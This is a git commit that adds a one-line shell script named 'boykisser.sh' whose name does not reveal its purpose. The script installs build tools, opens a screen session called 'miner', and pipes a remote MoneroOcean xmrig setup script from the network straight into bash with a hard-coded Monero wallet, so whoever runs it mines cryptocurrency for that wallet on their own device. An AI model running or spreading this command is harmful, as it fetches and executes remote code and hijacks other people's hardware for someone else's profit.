db1961319c6004c8eb69ec769ca8c9c1f8739912
ripevo1 <evorip@drugsellers.com>
2024-11-03 13:37:31 +0100

    Add files via upload

---
+++ boykisser.sh
@@ -0,0 +1,1 @@
+cd ~ & mkdir boykisser & cd boykisser & pkg install git cmake make screen clang & screen -S miner & curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4576JTdTYFp6hi2n2Ci54eSFzV8GSkNJTJVC1zswJpk7byZMSfu4W4mVpCsoQJHfSyQS6y5CkZ1kbZTTbUBbpFrYRgtzsrG
